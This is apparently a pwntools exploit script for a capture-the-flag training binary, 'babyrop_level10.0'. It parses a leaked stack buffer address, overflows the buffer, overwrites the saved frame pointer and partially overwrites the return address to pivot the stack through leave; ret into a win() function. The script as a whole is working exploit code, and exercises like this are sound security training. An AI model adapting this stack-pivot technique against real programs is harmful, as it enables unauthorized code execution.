from pwn import *

p = process("./babyrop_level10.0")

context.terminal = ['tmux',"splitw",'-h']

p.recvuntil(b"[LEAK] Your input buffer is located at: ")

leak = int(p.recvline().decode().split('.')[0],16)

log.success(leak)

# 0x00000000000027ac <+182>:   leave 
# 0x00000000000027ad <+183>:   ret
#The next ret will pop the value at [rsp] (which is now the pointer to win()) and jump there.after executing leave instruction rip will increment by 1 and execute ret which put top of stack to rip which is win pointer 

payload = b"A" * 104 + p64(leak-16) + b'\xac'



p.send(payload)

p.interactive()